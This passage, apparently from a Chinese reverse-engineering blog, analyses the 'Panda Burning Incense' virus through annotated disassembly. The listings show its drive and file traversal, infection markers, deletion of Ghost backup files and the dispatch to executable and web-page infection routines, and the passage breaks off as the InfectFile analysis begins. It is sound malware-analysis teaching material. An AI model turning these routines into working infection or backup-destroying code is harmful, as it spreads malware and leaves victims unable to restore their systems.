<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:0040CFB4 sub_40CFB4      proc near               ; CODE XREF: CODE:0040D178p</span><br><span class="line">CODE:0040CFB4                 call    sub_40A7EC</span><br><span class="line">CODE:0040CFB9                 call    sub_40C5B0</span><br><span class="line">CODE:0040CFBE                 mov     ax, 0Ah</span><br><span class="line">CODE:0040CFC2                 call    sub_40BD08</span><br><span class="line">CODE:0040CFC7                 retn</span><br><span class="line">CODE:0040CFC7 sub_40CFB4      endp</span><br></pre></td></tr></table></figure>

<p>此病毒通过3种方式进行感染，前两者sub_40A7EC、sub_40C5B0是在本地进行病毒的感染，第三种sub_40BD08需要的支持。</p>
<p>首先来看下sub_40A7EC(CreateInfectThread)的代码实现如下.</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230315163417385.png" class title="image-20230315163417385">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    offset sub_40A6C8;线程回调函数，病毒感染的实现在此函数中。</span><br></pre></td></tr></table></figure>

<p>具体感染流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:0040A6C8 sub_40A6C8      proc near               ; DATA XREF: sub_40A7EC+6o</span><br><span class="line">CODE:0040A6C8</span><br><span class="line">CODE:0040A6C8 var_20          = dword ptr -20h</span><br><span class="line">CODE:0040A6C8 var_1C          = dword ptr -1Ch</span><br><span class="line">CODE:0040A6C8 var_18          = dword ptr -18h</span><br><span class="line">CODE:0040A6C8 var_14          = dword ptr -14h</span><br><span class="line">CODE:0040A6C8 var_10          = dword ptr -10h</span><br><span class="line">CODE:0040A6C8 var_C           = dword ptr -0Ch</span><br><span class="line">CODE:0040A6C8 var_8           = dword ptr -8</span><br><span class="line">CODE:0040A6C8 var_4           = dword ptr -4</span><br><span class="line">CODE:0040A6C8</span><br><span class="line">CODE:0040A6C8                 push    ebp</span><br><span class="line">CODE:0040A6C9                 mov     ebp, esp</span><br><span class="line">CODE:0040A6CB                 xor     ecx, ecx</span><br><span class="line">CODE:0040A6CD                 push    ecx</span><br><span class="line">CODE:0040A6CE                 push    ecx</span><br><span class="line">CODE:0040A6CF                 push    ecx</span><br><span class="line">CODE:0040A6D0                 push    ecx</span><br><span class="line">CODE:0040A6D1                 push    ecx</span><br><span class="line">CODE:0040A6D2                 push    ecx</span><br><span class="line">CODE:0040A6D3                 push    ecx</span><br><span class="line">CODE:0040A6D4                 push    ecx</span><br><span class="line">CODE:0040A6D5                 push    ebx</span><br><span class="line">CODE:0040A6D6                 push    esi</span><br><span class="line">CODE:0040A6D7                 xor     eax, eax</span><br><span class="line">CODE:0040A6D9                 push    ebp</span><br><span class="line">CODE:0040A6DA                 push    offset loc_40A7BB</span><br><span class="line">CODE:0040A6DF                 push    dword ptr fs:[eax]</span><br><span class="line">CODE:0040A6E2                 mov     fs:[eax], esp</span><br><span class="line">CODE:0040A6E5                 lea     eax, [ebp+var_4]</span><br><span class="line">;存放驱动器名称字符串的首地址</span><br><span class="line">CODE:0040A6E8                 call    sub_4076B4</span><br><span class="line">;获得驱动器名称</span><br><span class="line">CODE:0040A6ED                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:0040A6F0                 call    sub_403ECC</span><br><span class="line">;获取驱动器个数</span><br><span class="line">CODE:0040A6F5                 mov     esi, eax</span><br><span class="line">CODE:0040A6F7</span><br><span class="line">CODE:0040A6F7 loc_40A6F7:                             ; CODE XREF: sub_40A6C8+34j</span><br><span class="line">CODE:0040A6F7                                         ; sub_40A6C8+D3j</span><br><span class="line">CODE:0040A6F7                 mov     ebx, esi</span><br><span class="line">CODE:0040A6F9                 cmp     ebx, 1</span><br><span class="line">CODE:0040A6FC                 jl      short loc_40A6F7</span><br><span class="line">;判断驱动器个数是否小于1，若小于1则跳转</span><br><span class="line"></span><br><span class="line">CODE:0040A6FE</span><br><span class="line">CODE:0040A6FE loc_40A6FE:                             ; CODE XREF: sub_40A6C8+CDj</span><br><span class="line">CODE:0040A6FE                 lea     eax, [ebp+var_C]</span><br><span class="line">CODE:0040A701                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:0040A704                 mov     dl, [edx+ebx-1]</span><br><span class="line">CODE:0040A708                 call    sub_403E2C</span><br><span class="line">;将字符串转换成字符</span><br><span class="line">CODE:0040A70D                 mov     eax, [ebp+var_C]</span><br><span class="line">CODE:0040A710                 lea     edx, [ebp+var_8]</span><br><span class="line">;保存大写驱动器名称</span><br><span class="line">CODE:0040A713                 call</span><br><span class="line">sub_40532C</span><br><span class="line">;将字符串转为大写</span><br><span class="line">CODE:0040A718                 mov     eax, [ebp+var_8]</span><br><span class="line">CODE:0040A71B                 push    eax</span><br><span class="line">CODE:0040A71C                 lea     edx, [ebp+var_10]</span><br><span class="line">CODE:0040A71F                 mov     eax, offset dword_40A7D0</span><br><span class="line">;&quot;a&quot;</span><br><span class="line">CODE:0040A724                 call    sub_40532C</span><br><span class="line">;将字符&quot;a&quot;转为大写</span><br><span class="line">CODE:0040A729                 mov     eax, [ebp+var_10]</span><br><span class="line">CODE:0040A72C                 pop     edx</span><br><span class="line">CODE:0040A72D                 call    sub_4041B4</span><br><span class="line">;查找字符&quot;A&quot;在字符串中的位置</span><br><span class="line">CODE:0040A732                 test    eax, eax</span><br><span class="line">CODE:0040A734                 jnz     short loc_40A792</span><br><span class="line">;递减遍历过驱动器数目</span><br><span class="line">CODE:0040A736                 lea     eax, [ebp+var_18]</span><br><span class="line">CODE:0040A739                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:0040A73C                 mov     dl, [edx+ebx-1]</span><br><span class="line">CODE:0040A740                 call    sub_403E2C</span><br><span class="line">CODE:0040A745                 mov     eax, [ebp+var_18]</span><br><span class="line">CODE:0040A748                 lea     edx, [ebp+var_14]</span><br><span class="line">CODE:0040A74B                 call    sub_40532C</span><br><span class="line">CODE:0040A750                 mov     eax, [ebp+var_14]</span><br><span class="line">CODE:0040A753                 push    eax</span><br><span class="line">CODE:0040A754                 lea     edx, [ebp+var_1C]</span><br><span class="line">CODE:0040A757                 mov     eax, offset dword_40A7DC</span><br><span class="line">CODE:0040A75C                 call    sub_40532C</span><br><span class="line">CODE:0040A761                 mov     eax, [ebp+var_1C]</span><br><span class="line">CODE:0040A764                 pop     edx</span><br><span class="line">CODE:0040A765                 call    sub_4041B4</span><br><span class="line">CODE:0040A76A                 test    eax, eax</span><br><span class="line">CODE:0040A76C                 jnz     short loc_40A792</span><br><span class="line">CODE:0040A76E                 lea     eax, [ebp+var_20]</span><br><span class="line">CODE:0040A771                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:0040A774                 mov     dl, [edx+ebx-1]</span><br><span class="line">;获取盘符</span><br><span class="line">CODE:0040A778                 call    sub_403E2C</span><br><span class="line">CODE:0040A77D                 lea     eax, [ebp+var_20]</span><br><span class="line">CODE:0040A780                 mov     edx, offset loc_40A7E8</span><br><span class="line">;“:\\”</span><br><span class="line">CODE:0040A785                 call    sub_403ED4</span><br><span class="line">;向盘符名称追加字符串&quot;:\\&quot;</span><br><span class="line">CODE:0040A78A                 mov     eax, [ebp+var_20]</span><br><span class="line">CODE:0040A78D                 call    sub_4094A4</span><br><span class="line">;通过查找到的驱动器盘符，遍历盘符中的各种文件并感染它们</span><br><span class="line">CODE:0040A792</span><br><span class="line">CODE:0040A792 loc_40A792:                             ; CODE XREF: sub_40A6C8+6Cj</span><br><span class="line">CODE:0040A792                                         ; sub_40A6C8+A4j</span><br><span class="line">CODE:0040A792                 dec     ebx</span><br><span class="line">;遍历结束后，驱动器数减1</span><br><span class="line">CODE:0040A793                 test    ebx, ebx</span><br><span class="line">CODE:0040A795                 jnz     loc_40A6FE</span><br><span class="line">;如果驱动器不为0，则继续遍历驱动器，并感染其中的文件</span><br><span class="line">CODE:0040A79B                 jmp     loc_40A6F7</span><br><span class="line">;遍历感染结束</span><br><span class="line">CODE:0040A79B sub_40A6C8      endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述代码主要是遍历驱动器盘符的数目，并通过sub_4094A4函数进入到驱动器中，遍历所有可感染文件以进行病毒复制。</p>
<p>下面我们进入sub_4094A4函数看下这个函数的工作流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:004094A4 sub_4094A4      proc near               ; CODE XREF: sub_408944+8AAp</span><br><span class="line">CODE:004094A4                                         ; sub_4094A4+915p ...</span><br><span class="line">CODE:004094A4</span><br><span class="line">CODE:004094A4 var_334         = dword ptr -334h</span><br><span class="line">CODE:004094A4 var_330         = dword ptr -330h</span><br><span class="line">CODE:004094A4 var_32C         = dword ptr -32Ch</span><br><span class="line">CODE:004094A4 var_328         = dword ptr -328h</span><br><span class="line">CODE:004094A4 var_324         = dword ptr -324h</span><br><span class="line">CODE:004094A4 var_320         = dword ptr -320h</span><br><span class="line">CODE:004094A4 var_31C         = dword ptr -31Ch</span><br><span class="line">CODE:004094A4 var_318         = dword ptr -318h</span><br><span class="line">CODE:004094A4 var_314         = dword ptr -314h</span><br><span class="line">CODE:004094A4 var_310         = dword ptr -310h</span><br><span class="line">CODE:004094A4 var_30C         = dword ptr -30Ch</span><br><span class="line">CODE:004094A4 var_308         = dword ptr -308h</span><br><span class="line">CODE:004094A4 var_304         = dword ptr -304h</span><br><span class="line">CODE:004094A4 var_300         = dword ptr -300h</span><br><span class="line">CODE:004094A4 var_2FC         = dword ptr -2FCh</span><br><span class="line">CODE:004094A4 var_2F8         = dword ptr -2F8h</span><br><span class="line">CODE:004094A4 var_2F4         = dword ptr -2F4h</span><br><span class="line">CODE:004094A4 var_2F0         = dword ptr -2F0h</span><br><span class="line">CODE:004094A4 var_2EC         = dword ptr -2ECh</span><br><span class="line">CODE:004094A4 var_2E8         = dword ptr -2E8h</span><br><span class="line">CODE:004094A4 var_2E4         = dword ptr -2E4h</span><br><span class="line">CODE:004094A4 var_2E0         = dword ptr -2E0h</span><br><span class="line">CODE:004094A4 var_2DC         = dword ptr -2DCh</span><br><span class="line">CODE:004094A4 var_2D8         = dword ptr -2D8h</span><br><span class="line">CODE:004094A4 var_2D4         = dword ptr -2D4h</span><br><span class="line">CODE:004094A4 var_2D0         = dword ptr -2D0h</span><br><span class="line">CODE:004094A4 var_2CC         = dword ptr -2CCh</span><br><span class="line">CODE:004094A4 var_2C8         = dword ptr -2C8h</span><br><span class="line">CODE:004094A4 var_2C4         = dword ptr -2C4h</span><br><span class="line">CODE:004094A4 var_2C0         = dword ptr -2C0h</span><br><span class="line">CODE:004094A4 var_2BC         = dword ptr -2BCh</span><br><span class="line">CODE:004094A4 var_2B8         = dword ptr -2B8h</span><br><span class="line">CODE:004094A4 var_2B4         = dword ptr -2B4h</span><br><span class="line">CODE:004094A4 var_2B0         = dword ptr -2B0h</span><br><span class="line">CODE:004094A4 var_2AC         = dword ptr -2ACh</span><br><span class="line">CODE:004094A4 var_2A8         = dword ptr -2A8h</span><br><span class="line">CODE:004094A4 var_2A4         = dword ptr -2A4h</span><br><span class="line">CODE:004094A4 var_2A0         = dword ptr -2A0h</span><br><span class="line">CODE:004094A4 var_29C         = dword ptr -29Ch</span><br><span class="line">CODE:004094A4 var_298         = dword ptr -298h</span><br><span class="line">CODE:004094A4 var_294         = dword ptr -294h</span><br><span class="line">CODE:004094A4 var_290         = dword ptr -290h</span><br><span class="line">CODE:004094A4 var_28C         = dword ptr -28Ch</span><br><span class="line">CODE:004094A4 var_288         = dword ptr -288h</span><br><span class="line">CODE:004094A4 var_284         = dword ptr -284h</span><br><span class="line">CODE:004094A4 var_280         = dword ptr -280h</span><br><span class="line">CODE:004094A4 var_27C         = dword ptr -27Ch</span><br><span class="line">CODE:004094A4 var_278         = dword ptr -278h</span><br><span class="line">CODE:004094A4 var_274         = dword ptr -274h</span><br><span class="line">CODE:004094A4 var_270         = dword ptr -270h</span><br><span class="line">CODE:004094A4 var_26C         = dword ptr -26Ch</span><br><span class="line">CODE:004094A4 var_268         = dword ptr -268h</span><br><span class="line">CODE:004094A4 var_264         = dword ptr -264h</span><br><span class="line">CODE:004094A4 var_260         = dword ptr -260h</span><br><span class="line">CODE:004094A4 var_25C         = dword ptr -25Ch</span><br><span class="line">CODE:004094A4 var_258         = dword ptr -258h</span><br><span class="line">CODE:004094A4 var_254         = dword ptr -254h</span><br><span class="line">CODE:004094A4 var_250         = dword ptr -250h</span><br><span class="line">CODE:004094A4 var_24C         = dword ptr -24Ch</span><br><span class="line">CODE:004094A4 var_248         = dword ptr -248h</span><br><span class="line">CODE:004094A4 dwFileAttributes= dword ptr -244h</span><br><span class="line">CODE:004094A4 var_240         = dword ptr -240h</span><br><span class="line">CODE:004094A4 var_23C         = dword ptr -23Ch</span><br><span class="line">CODE:004094A4 var_238         = dword ptr -238h</span><br><span class="line">CODE:004094A4 var_234         = dword ptr -234h</span><br><span class="line">CODE:004094A4 var_230         = dword ptr -230h</span><br><span class="line">CODE:004094A4 var_22C         = dword ptr -22Ch</span><br><span class="line">CODE:004094A4 var_228         = dword ptr -228h</span><br><span class="line">CODE:004094A4 var_224         = dword ptr -224h</span><br><span class="line">CODE:004094A4 var_220         = dword ptr -220h</span><br><span class="line">CODE:004094A4 var_21C         = dword ptr -21Ch</span><br><span class="line">CODE:004094A4 var_218         = dword ptr -218h</span><br><span class="line">CODE:004094A4 var_214         = dword ptr -214h</span><br><span class="line">CODE:004094A4 var_210         = dword ptr -210h</span><br><span class="line">CODE:004094A4 var_20C         = dword ptr -20Ch</span><br><span class="line">CODE:004094A4 var_208         = dword ptr -208h</span><br><span class="line">CODE:004094A4 var_204         = dword ptr -204h</span><br><span class="line">CODE:004094A4 var_200         = dword ptr -200h</span><br><span class="line">CODE:004094A4 var_1FC         = dword ptr -1FCh</span><br><span class="line">CODE:004094A4 var_1F8         = dword ptr -1F8h</span><br><span class="line">CODE:004094A4 var_1F4         = dword ptr -1F4h</span><br><span class="line">CODE:004094A4 var_1F0         = dword ptr -1F0h</span><br><span class="line">CODE:004094A4 var_1EC         = dword ptr -1ECh</span><br><span class="line">CODE:004094A4 var_1E8         = dword ptr -1E8h</span><br><span class="line">CODE:004094A4 var_1E4         = dword ptr -1E4h</span><br><span class="line">CODE:004094A4 var_1E0         = dword ptr -1E0h</span><br><span class="line">CODE:004094A4 var_1DC         = dword ptr -1DCh</span><br><span class="line">CODE:004094A4 var_1D8         = dword ptr -1D8h</span><br><span class="line">CODE:004094A4 var_1D4         = dword ptr -1D4h</span><br><span class="line">CODE:004094A4 var_1D0         = dword ptr -1D0h</span><br><span class="line">CODE:004094A4 var_1CC         = dword ptr -1CCh</span><br><span class="line">CODE:004094A4 var_1C8         = dword ptr -1C8h</span><br><span class="line">CODE:004094A4 var_1C4         = dword ptr -1C4h</span><br><span class="line">CODE:004094A4 var_1C0         = dword ptr -1C0h</span><br><span class="line">CODE:004094A4 var_1BC         = dword ptr -1BCh</span><br><span class="line">CODE:004094A4 var_1B8         = dword ptr -1B8h</span><br><span class="line">CODE:004094A4 var_1B4         = dword ptr -1B4h</span><br><span class="line">CODE:004094A4 var_1B0         = dword ptr -1B0h</span><br><span class="line">CODE:004094A4 var_1AC         = dword ptr -1ACh</span><br><span class="line">CODE:004094A4 var_1A8         = dword ptr -1A8h</span><br><span class="line">CODE:004094A4 var_1A4         = dword ptr -1A4h</span><br><span class="line">CODE:004094A4 var_1A0         = dword ptr -1A0h</span><br><span class="line">CODE:004094A4 var_19C         = dword ptr -19Ch</span><br><span class="line">CODE:004094A4 var_198         = dword ptr -198h</span><br><span class="line">CODE:004094A4 var_194         = dword ptr -194h</span><br><span class="line">CODE:004094A4 var_190         = dword ptr -190h</span><br><span class="line">CODE:004094A4 var_18C         = dword ptr -18Ch</span><br><span class="line">CODE:004094A4 var_188         = dword ptr -188h</span><br><span class="line">CODE:004094A4 var_184         = dword ptr -184h</span><br><span class="line">CODE:004094A4 var_180         = dword ptr -180h</span><br><span class="line">CODE:004094A4 var_17C         = dword ptr -17Ch</span><br><span class="line">CODE:004094A4 var_178         = dword ptr -178h</span><br><span class="line">CODE:004094A4 SystemTime      = _SYSTEMTIME ptr -174h</span><br><span class="line">CODE:004094A4 var_164         = byte ptr -164h</span><br><span class="line">CODE:004094A4 var_15C         = dword ptr -15Ch</span><br><span class="line">CODE:004094A4 var_158         = dword ptr -158h</span><br><span class="line">CODE:004094A4 var_C           = dword ptr -0Ch</span><br><span class="line">CODE:004094A4 var_8           = dword ptr -8</span><br><span class="line">CODE:004094A4 var_4           = dword ptr -4</span><br><span class="line">CODE:004094A4</span><br><span class="line">CODE:004094A4                 push    ebp</span><br><span class="line">CODE:004094A5                 mov     ebp, esp</span><br><span class="line">CODE:004094A7                 mov     ecx, 66h</span><br><span class="line">CODE:004094AC</span><br><span class="line">CODE:004094AC loc_4094AC:                             ; CODE XREF: sub_4094A4+Dj</span><br><span class="line">CODE:004094AC                 push    0</span><br><span class="line">CODE:004094AE                 push    0</span><br><span class="line">CODE:004094B0                 dec     ecx</span><br><span class="line">CODE:004094B1                 jnz     short loc_4094AC</span><br><span class="line">CODE:004094B3                 push    ecx</span><br><span class="line">CODE:004094B4                 push    ebx</span><br><span class="line">CODE:004094B5                 push    esi</span><br><span class="line">CODE:004094B6                 push    edi</span><br><span class="line">CODE:004094B7                 mov     [ebp+var_4], eax</span><br><span class="line">CODE:004094BA                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:004094BD                 call    sub_4040BC</span><br><span class="line">CODE:004094C2                 lea     eax, [ebp+var_164]</span><br><span class="line">CODE:004094C8                 mov     edx, off_4075A0</span><br><span class="line">CODE:004094CE                 call    sub_404414</span><br><span class="line">CODE:004094D3                 xor     eax, eax</span><br><span class="line">CODE:004094D5                 push    ebp</span><br><span class="line">CODE:004094D6                 push    offset loc_40A360</span><br><span class="line">CODE:004094DB                 push    dword ptr fs:[eax]</span><br><span class="line">CODE:004094DE                 mov     fs:[eax], esp</span><br><span class="line">CODE:004094E1                 xor     eax, eax</span><br><span class="line">CODE:004094E3                 push    ebp</span><br><span class="line">CODE:004094E4                 push    offset loc_40A2F4</span><br><span class="line">CODE:004094E9                 push    dword ptr fs:[eax]</span><br><span class="line">CODE:004094EC                 mov     fs:[eax], esp</span><br><span class="line">CODE:004094EF                 mov     eax, [ebp+var_4]</span><br><span class="line">;驱动器字符串首地址</span><br><span class="line">CODE:004094F2                 call    sub_403ECC</span><br><span class="line">CODE:004094F7                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:004094FA                 cmp     byte ptr [edx+eax-1], 5Ch</span><br><span class="line">;判断字符串结尾是否为&quot;\&quot;，</span><br><span class="line">CODE:004094FF                 jz      short loc_40950E</span><br><span class="line">CODE:00409501                 lea     eax, [ebp+var_4]</span><br><span class="line">;如果读到结尾没有&#x27;\&#x27;,则拼接一个&quot;\\&quot;</span><br><span class="line">CODE:00409504                 mov     edx, offset dword_40A378</span><br><span class="line">;字符串&quot;\\&quot;</span><br><span class="line">CODE:00409509                 call    sub_403ED4</span><br><span class="line">CODE:0040950E</span><br><span class="line">CODE:0040950E loc_40950E:                             ; CODE XREF: sub_4094A4+5Bj</span><br><span class="line">CODE:0040950E                 lea     eax, [ebp+var_178]</span><br><span class="line">CODE:00409514                 mov     ecx, offset dword_40A384</span><br><span class="line">;字符串&quot;*.*&quot;</span><br><span class="line">CODE:00409519                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:0040951C                 call    sub_403F18</span><br><span class="line">;将字符串&quot;*.*&quot;追加到驱动器路径后</span><br><span class="line">CODE:00409521                 mov     eax, [ebp+var_178]</span><br><span class="line">CODE:00409527                 lea     ecx, [ebp+var_164]</span><br><span class="line">CODE:0040952D                 mov     edx, 3Fh</span><br><span class="line">CODE:00409532                 call    sub_407640</span><br><span class="line">;查找文件属性(文件、目录、特殊文件等)</span><br><span class="line">CODE:00409537                 test    eax, eax</span><br><span class="line">CODE:00409539                 jnz     loc_40A2DF</span><br><span class="line">CODE:0040953F</span><br><span class="line">CODE:0040953F loc_40953F:                             ; CODE XREF: sub_4094A4+E35j</span><br><span class="line">CODE:0040953F                 mov     eax, [ebp+var_15C]</span><br><span class="line">CODE:00409545                 and     eax, 10h</span><br><span class="line">CODE:00409548                 cmp     eax, 10h</span><br><span class="line">;检查是否为目录</span><br><span class="line">CODE:0040954B                 jnz     loc_409DC3</span><br><span class="line">CODE:00409551                 mov     eax, [ebp+var_158]</span><br><span class="line">;获取到的文件夹名称</span><br><span class="line">CODE:00409557                 cmp     byte ptr [eax], 2Eh</span><br><span class="line">;比较文件的第一个字符是否为&quot;.&quot;</span><br><span class="line">CODE:0040955A                 jz      loc_409DC3</span><br><span class="line">CODE:00409560                 lea     edx, [ebp+var_17C]</span><br><span class="line">;排除特殊文件，保存排除文件夹的名称</span><br><span class="line">CODE:00409566                 mov     eax, offset aWindows_0 ; &quot;WINDOWS&quot;</span><br><span class="line">CODE:0040956B                 call    sub_40532C</span><br><span class="line">CODE:00409570                 mov     eax, [ebp+var_17C]</span><br><span class="line">CODE:00409576                 push    eax</span><br><span class="line">CODE:00409577                 lea     edx, [ebp+var_180]</span><br><span class="line">CODE:0040957D                 mov     eax, [ebp+var_158]</span><br><span class="line">CODE:00409583                 call    sub_40532C</span><br><span class="line">CODE:00409588                 mov     edx, [ebp+var_180]</span><br><span class="line">;取出所获取文件夹的名称的大写形式</span><br><span class="line">CODE:0040958E                 pop     eax</span><br><span class="line">CODE:0040958F                 call    sub_404018</span><br><span class="line">;比较是否为特殊过滤文件夹</span><br><span class="line">CODE:00409594                 jz      loc_40A2CC</span><br></pre></td></tr></table></figure>

<p>上述代码遍历了驱动器下的文件信息，并将文件与文件夹进行分类，排除了特殊文件夹。在判断是否为特殊文件夹的过程中，都是以大写形式进行对比的。当查询到文件而并非是特殊文件夹时，病毒程序执行破坏性操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:00409A22                 push    [ebp+var_4]</span><br><span class="line">CODE:00409A25                 push    [ebp+var_158]</span><br><span class="line">CODE:00409A2B                 push    offset dword_40A580</span><br><span class="line">CODE:00409A30                 lea     eax, [ebp+var_224]</span><br><span class="line">CODE:00409A36                 mov     edx, 3</span><br><span class="line">CODE:00409A3B                 call    sub_403F8C</span><br><span class="line">CODE:00409A40                 mov     eax, [ebp+var_224]</span><br><span class="line">CODE:00409A46                 call    sub_4057A4</span><br><span class="line">CODE:00409A4B                 test    al, al</span><br><span class="line">CODE:00409A4D                 jz      loc_409C67</span><br><span class="line">CODE:00409A53                 push    [ebp+var_4]</span><br><span class="line">CODE:00409A56                 push    [ebp+var_158]</span><br><span class="line">CODE:00409A5C                 push    offset dword_40A580</span><br><span class="line">CODE:00409A61                 lea     eax, [ebp+var_228]</span><br><span class="line">CODE:00409A67                 mov     edx, 3</span><br><span class="line">CODE:00409A6C                 call    sub_403F8C</span><br><span class="line">CODE:00409A71                 mov     eax, [ebp+var_228]</span><br><span class="line">CODE:00409A77                 lea     edx, [ebp+var_8]</span><br><span class="line">CODE:00409A7A                 call    sub_407760</span><br><span class="line">CODE:00409A7F                 lea     eax, [ebp+SystemTime]</span><br><span class="line">CODE:00409A85                 push    eax             ; lpSystemTime</span><br><span class="line">CODE:00409A86                 call    GetLocalTime</span><br><span class="line">CODE:00409A8B                 lea     edx, [ebp+var_22C]</span><br><span class="line">CODE:00409A91                 movzx   eax, [ebp+SystemTime.wYear]</span><br><span class="line">CODE:00409A98                 call    sub_40587C</span><br><span class="line">CODE:00409A9D                 push    [ebp+var_22C]</span><br><span class="line">CODE:00409AA3                 push    offset dword_40A598</span><br><span class="line">CODE:00409AA8                 lea     edx, [ebp+var_230]</span><br><span class="line">CODE:00409AAE                 movzx   eax, [ebp+SystemTime.wMonth]</span><br><span class="line">CODE:00409AB5                 call    sub_40587C</span><br><span class="line">CODE:00409ABA                 push    [ebp+var_230]</span><br><span class="line">CODE:00409AC0                 push    offset dword_40A598</span><br><span class="line">CODE:00409AC5                 lea     edx, [ebp+var_234]</span><br><span class="line">CODE:00409ACB                 movzx   eax, [ebp+SystemTime.wDay]</span><br><span class="line">CODE:00409AD2                 call    sub_40587C</span><br><span class="line">CODE:00409AD7                 push    [ebp+var_234]</span><br><span class="line">CODE:00409ADD                 lea     eax, [ebp+var_C]</span><br><span class="line">CODE:00409AE0                 mov     edx, 5</span><br><span class="line">CODE:00409AE5                 call    sub_403F8C</span><br><span class="line">CODE:00409AEA                 mov     eax, [ebp+var_8]</span><br><span class="line">CODE:00409AED                 mov     edx, [ebp+var_C]</span><br><span class="line">CODE:00409AF0                 call    sub_404018</span><br><span class="line">CODE:00409AF5                 jnz     short loc_409B49</span><br><span class="line">CODE:00409AF7                 push    [ebp+var_4]</span><br><span class="line">CODE:00409AFA                 push    [ebp+var_158]</span><br><span class="line">CODE:00409B00                 push    offset dword_40A5A4</span><br><span class="line">CODE:00409B05                 lea     eax, [ebp+var_238]</span><br><span class="line">CODE:00409B0B                 mov     edx, 3</span><br><span class="line">CODE:00409B10                 call    sub_403F8C</span><br><span class="line">CODE:00409B15                 mov     eax, [ebp+var_238]</span><br><span class="line">CODE:00409B1B                 mov     edx, offset dword_40A5BC</span><br><span class="line">CODE:00409B20                 call    sub_4050F0</span><br><span class="line">CODE:00409B25                 lea     eax, [ebp+var_23C]</span><br><span class="line">CODE:00409B2B                 mov     ecx, [ebp+var_158]</span><br><span class="line">CODE:00409B31                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:00409B34                 call    sub_403F18</span><br><span class="line">CODE:00409B39                 mov     eax, [ebp+var_23C]</span><br><span class="line">CODE:00409B3F                 call    sub_408944</span><br><span class="line">CODE:00409B44                 jmp     loc_40A2CC</span><br></pre></td></tr></table></figure>

<p>执行了感染前的检查工作，此段代码会在驱动器”C”盘下生成一份记录文件”test.txt”。文件感染后，将会修改目录中的”Desktop _ .ini “文件，并写入感染时间。若文件已经被感染，则会将流程跳转到地址标号loc_409B49处，该处代码只设置了”Desktop _ .ini”的文件属性，将其修改为READONLY、HIDDEN、SYSTEM。</p>
<p>当一个文件遍历结束后，会回到loc_40953f处，重新遍历文件，重复之前分析过的操作，这里并没有感染文件。当查找到目标是文件属性后，则会跳转到地址标号loc_409DC3处，这里就是对文件的感染操作了，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ODE:00409DC3</span><br><span class="line">CODE:00409DC3 loc_409DC3:                             ; CODE XREF: sub_4094A4+A7j</span><br><span class="line">CODE:00409DC3                                         ; sub_4094A4+B6j</span><br><span class="line">CODE:00409DC3                 mov     eax, [ebp+var_158]</span><br><span class="line">CODE:00409DC9                 cmp     byte ptr [eax], 2Eh</span><br><span class="line">CODE:00409DCC                 jz      loc_40A2C5</span><br><span class="line">CODE:00409DD2                 lea     edx, [ebp+var_27C]</span><br><span class="line">CODE:00409DD8                 mov     eax, [ebp+var_158]</span><br><span class="line">CODE:00409DDE                 call    sub_405458</span><br><span class="line">;获取指定文件名的后缀名</span><br><span class="line">CODE:00409DE3                 mov     eax, [ebp+var_27C]</span><br><span class="line">CODE:00409DE9                 lea     edx, [ebp+var_278]</span><br><span class="line">CODE:00409DEF                 call    sub_405700</span><br><span class="line">;格式化后缀名，如果后缀名是小写，则转换为大写</span><br><span class="line">CODE:00409DF4                 mov     eax, [ebp+var_278]</span><br><span class="line">CODE:00409DFA                 mov     edx, offset dword_40A618</span><br><span class="line">;“GHO”</span><br><span class="line">CODE:00409DFF                 call    sub_404018</span><br><span class="line">;字符串比较函数</span><br><span class="line">CODE:00409E04                 jnz     short loc_409E2B</span><br><span class="line">CODE:00409E06                 lea     eax, [ebp+var_280]</span><br><span class="line">CODE:00409E0C                 mov     ecx, [ebp+var_158]</span><br><span class="line">CODE:00409E12                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:00409E15                 call    sub_403F18</span><br><span class="line">;路径拼接</span><br><span class="line">CODE:00409E1A                 mov     eax, [ebp+var_280]</span><br><span class="line">CODE:00409E20                 call    sub_4040CC</span><br><span class="line">CODE:00409E25                 push    eax             ; lpFileName</span><br><span class="line">CODE:00409E26                 call    DeleteFileA</span><br><span class="line">;删除ghost备份文件，使用户无法还原</span><br><span class="line">CODE:00409E2B</span><br></pre></td></tr></table></figure>

<p>对文件进行检查，只要后缀名为”‘GHO’”,就会判断其为ghost文件，直接删除，防止用户还原系统。</p>
<p>一旦删除系统备份文件，病毒就开始肆意感染。感染文件类型有两种:exe、scr、pif、com和tm、html、asp、php、jsp、aspx。这两类不同的感染处理方式，我们来看下loc_409E2B处继续分析，如下</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230315174423588.png" class title="image-20230315174423588">

<p>上述代码为检查文件后缀，若为exe等则调用sub_40800c(InfectFile)函数实现感染方式。</p>
<img src="/2023/03/12/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8-%E2%80%9C%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E2%80%9D%E7%97%85%E6%AF%92/image-20230315174657882.png" class title="image-20230315174657882">

<p>上述是检查后缀名是否为tm等后缀，调用sub_407ADC (InfectWeb)进行感染方式。</p>
<p>我们先来看下infectFile的感染过程</p>
